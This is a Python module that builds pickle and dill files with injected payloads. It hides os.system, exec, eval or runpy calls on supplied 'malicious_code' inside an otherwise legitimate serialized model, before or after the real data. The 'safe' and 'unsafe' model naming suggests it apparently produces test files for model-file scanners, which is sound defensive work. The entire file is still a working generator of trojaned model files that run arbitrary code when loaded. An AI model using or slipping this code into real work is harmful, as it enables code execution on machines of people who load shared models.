import dill
import os
import pickle
import struct
from typing import Any, Tuple
import os


class PickleInject:
    """Pickle injection"""

    def __init__(self, inj_objs: Any, first: bool = True):
        self.__name__ = "pickle_inject"
        self.inj_objs = inj_objs
        self.first = first

    class _Pickler(pickle._Pickler):
        """Reimplementation of Pickler with support for injection"""

        def __init__(
            self, file: Any, protocol: Any, inj_objs: Any, first: bool = True
        ) -> None:
            """
            file: File object with write attribute
            protocol: Pickle protocol - Currently the default protocol is 4: https://docs.python.org/3/library/pickle.html
            inj_objs: _joblibInject object that has both the command, and the code to be injected
            first: Boolean object to determine if inj_objs should be serialized before the safe file or after the safe file.
            """
            super().__init__(file, protocol)
            self.inj_objs = inj_objs
            self.first = first

        def dump(self, obj: Any) -> None:
            """Pickle data, inject object before or after"""
            if self.proto >= 2:  # type: ignore[attr-defined]
                self.write(pickle.PROTO + struct.pack("<B", self.proto))  # type: ignore[attr-defined]
            if self.proto >= 4:  # type: ignore[attr-defined]
                self.framer.start_framing()  # type: ignore[attr-defined]

            # Inject the object(s) before the user-supplied data?
            if self.first:
                # Pickle injected objects
                for inj_obj in self.inj_objs:
                    self.save(inj_obj)  # type: ignore[attr-defined]

            # Pickle user-supplied data
            self.save(obj)  # type: ignore[attr-defined]

            # Inject the object(s) after the user-supplied data?
            if not self.first:
                # Pickle injected objects
                for inj_obj in self.inj_objs:
                    self.save(inj_obj)  # type: ignore[attr-defined]

            self.write(pickle.STOP)  # type: ignore[attr-defined]
            self.framer.end_framing()  # type: ignore[attr-defined]

    def Pickler(self, file: Any, protocol: Any) -> _Pickler:
        # Initialise the pickler interface with the injected object
        return self._Pickler(file, protocol, self.inj_objs)

    class _PickleInject:
        """Base class for pickling injected commands"""

        def __init__(self, args: Any, command: Any = None) -> None:
            self.command = command
            self.args = args

        def __reduce__(self) -> Tuple[Any, Any]:
            """
            In general, the __reduce__ function is used by pickle to serialize objects.
            If defined for an object, pickle would override its default __reduce__ function and serialize the object as outlined by the custom specified __reduce__ function,
            The object returned by __reduce__ here is a callable: (self.command), and the tuple: with first element (self.args) is the code to be executed by self.command.
            """
            return self.command, (self.args,)

    class System(_PickleInject):
        """Create os.system command"""

        def __init__(self, args: Any) -> None:
            super().__init__(args, command=os.system)

    class Exec(_PickleInject):
        """Create exec command"""

        def __init__(self, args: Any) -> None:
            super().__init__(args, command=exec)

    class Eval(_PickleInject):
        """Create eval command"""

        def __init__(self, args: Any) -> None:
            super().__init__(args, command=eval)

    class RunPy(_PickleInject):
        """Create runpy command"""

        def __init__(self, args: Any) -> None:
            import runpy

            super().__init__(args, command=runpy._run_code)  # type: ignore[attr-defined]

        def __reduce__(self) -> Tuple[Any, Any]:
            return self.command, (self.args, {})


def get_pickle_payload(command: str, malicious_code: str) -> Any:
    if command == "system":
        payload: Any = PickleInject.System(malicious_code)
    elif command == "exec":
        payload = PickleInject.Exec(malicious_code)
    elif command == "eval":
        payload = PickleInject.Eval(malicious_code)
    elif command == "runpy":
        payload = PickleInject.RunPy(malicious_code)
    return payload


def generate_unsafe_pickle_file(
    safe_model: Any, command: str, malicious_code: str, unsafe_model_path: str
) -> None:
    payload = get_pickle_payload(command, malicious_code)
    pickle_protocol = 4
    file_for_unsafe_model = open(unsafe_model_path, "wb")
    mypickler = PickleInject._Pickler(file_for_unsafe_model, pickle_protocol, [payload])
    mypickler.dump(safe_model)
    file_for_unsafe_model.close()


class DillInject:
    """Code injection using Dill Pickler"""

    def __init__(self, inj_objs: Any, first: bool = True):
        self.__name__ = "dill_inject"
        self.inj_objs = inj_objs
        self.first = first

    class _Pickler(dill._dill.Pickler):  # type: ignore[misc]
        """Reimplementation of Pickler with support for injection"""

        def __init__(self, file: Any, protocol: Any, inj_objs: Any, first: bool = True):
            super().__init__(file, protocol)
            self.inj_objs = inj_objs
            self.first = first

        def dump(self, obj: Any) -> None:
            """Pickle data, inject object before or after"""
            if self.proto >= 2:
                self.write(pickle.PROTO + struct.pack("<B", self.proto))
            if self.proto >= 4:
                self.framer.start_framing()

            # Inject the object(s) before the user-supplied data?
            if self.first:
                # Pickle injected objects
                for inj_obj in self.inj_objs:
                    self.save(inj_obj)

            # Pickle user-supplied data
            self.save(obj)

            # Inject the object(s) after the user-supplied data?
            if not self.first:
                # Pickle injected objects
                for inj_obj in self.inj_objs:
                    self.save(inj_obj)

            self.write(pickle.STOP)
            self.framer.end_framing()

    def DillPickler(self, file: Any, protocol: Any) -> _Pickler:
        # Initialise the pickler interface with the injected object
        return self._Pickler(file, protocol, self.inj_objs)

    class _DillInject:
        """Base class for pickling injected commands"""

        def __init__(self, args: Any, command: Any = None):
            self.command = command
            self.args = args

        def __reduce__(self) -> Tuple[Any, Any]:
            return self.command, (self.args,)

    class System(_DillInject):
        """Create os.system command"""

        def __init__(self, args: Any):
            super().__init__(args, command=os.system)

    class Exec(_DillInject):
        """Create exec command"""

        def __init__(self, args: Any):
            super().__init__(args, command=exec)

    class Eval(_DillInject):
        """Create eval command"""

        def __init__(self, args: Any):
            super().__init__(args, command=eval)

    class RunPy(_DillInject):
        """Create runpy command"""

        def __init__(self, args: Any):
            import runpy

            super().__init__(args, command=runpy._run_code)  # type: ignore[attr-defined]

        def __reduce__(self) -> Any:
            return self.command, (self.args, {})


def get_dill_payload(command: str, malicious_code: str) -> Any:
    payload: Any
    if command == "system":
        payload = DillInject.System(malicious_code)
    elif command == "exec":
        payload = DillInject.Exec(malicious_code)
    elif command == "eval":
        payload = DillInject.Eval(malicious_code)
    elif command == "runpy":
        payload = DillInject.RunPy(malicious_code)
    return payload


def generate_dill_unsafe_file(
    safe_model: Any, command: str, malicious_code: str, unsafe_model_path: str
) -> None:
    payload = get_dill_payload(command, malicious_code)
    pickle_protocol = 4
    file_for_unsafe_model = open(unsafe_model_path, "wb")
    mypickler = DillInject._Pickler(file_for_unsafe_model, pickle_protocol, [payload])
    mypickler.dump(safe_model)
    file_for_unsafe_model.close()
